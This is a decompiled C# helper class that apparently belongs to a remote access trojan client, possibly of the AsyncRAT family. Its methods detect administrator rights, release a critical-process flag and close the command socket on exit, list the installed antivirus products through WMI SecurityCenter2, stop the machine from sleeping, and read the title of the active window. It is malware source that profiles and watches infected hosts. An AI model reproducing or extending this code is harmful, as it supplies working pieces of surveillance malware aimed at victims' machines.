using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.Management;
using System.Security.Principal;
using System.Text;
using Client.Connection;

namespace Client.Helper;

public static class Methods
{
	public static bool IsAdmin()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static void ClientOnExit()
	{
		try
		{
			if (Convert.ToBoolean(Settings.BDOS) && IsAdmin())
			{
				ProcessCritical.Exit();
			}
			MutexControl.CloseMutex();
			ClientSocket.SslClient?.Close();
			ClientSocket.TcpClient?.Close();
		}
		catch
		{
		}
	}

	public static string Antivirus()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct");
			try
			{
				List<string> list = new List<string>();
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.Current;
						list.Add(current["displayName"].ToString());
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				if (list.Count == 0)
				{
					return "N/A";
				}
				return string.Join(", ", list.ToArray());
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
			return "N/A";
		}
	}

	public static ImageCodecInfo GetEncoder(ImageFormat format)
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		ImageCodecInfo[] imageDecoders = ImageCodecInfo.GetImageDecoders();
		foreach (ImageCodecInfo val in imageDecoders)
		{
			if (val.FormatID == format.Guid)
			{
				return val;
			}
		}
		return null;
	}

	public static void PreventSleep()
	{
		try
		{
			NativeMethods.SetThreadExecutionState((NativeMethods.EXECUTION_STATE)2147483651u);
		}
		catch
		{
		}
	}

	public static string GetActiveWindowTitle()
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			if (NativeMethods.GetWindowText(NativeMethods.GetForegroundWindow(), stringBuilder, 256) > 0)
			{
				return stringBuilder.ToString();
			}
		}
		catch
		{
		}
		return "";
	}
}
